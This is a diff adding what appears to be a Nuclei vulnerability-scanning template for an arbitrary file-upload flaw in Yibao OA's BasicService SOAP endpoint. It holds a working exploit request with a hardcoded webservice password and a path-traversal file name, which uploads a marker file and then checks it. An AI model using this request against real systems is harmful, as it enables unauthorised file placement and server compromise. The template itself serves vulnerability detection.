@@ -1,0 +1,36 @@
+id: yibaoOA-BasicService-upload
+
+info:
+  name: 易宝 OA系统basicservice文件上传漏洞
+  author: yibaoOA
+  severity: high
+  tags: yibaoOA
+
+http:
+  - raw:
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: http://tempuri.org/UploadPersonalFile
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><UploadPersonalFile xmlns="http://tempuri.org/"><fs>MzZzNWQ2dzl0NXFkNmY=</fs><FileName>../../manager/1y369da5.txt</FileName><webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword></UploadPersonalFile></soap:Body></soap:Envelope>
+
+      - |+
+        GET /1y369da5.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '36s5d6w9t5qd6f'
+    matchers-condition: and
